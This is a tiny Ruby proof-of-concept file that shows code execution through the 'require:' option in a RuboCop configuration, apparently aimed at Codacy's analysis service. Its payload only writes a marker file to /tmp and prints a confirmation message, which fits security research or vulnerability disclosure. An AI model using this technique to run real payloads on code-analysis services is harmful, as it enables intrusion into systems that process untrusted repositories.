# PoC payload — benign marker only. Loaded via RuboCop `require:` -> Kernel#require.
File.write("/tmp/codacy-rubocop-rce-confirmed.txt", "RCE confirmed via .rubocop.yml require: (#{__FILE__})\n")
warn "CODEX-RCE-MARKER-RUBOCOP #{__FILE__} /tmp/codacy-rubocop-rce-confirmed.txt"
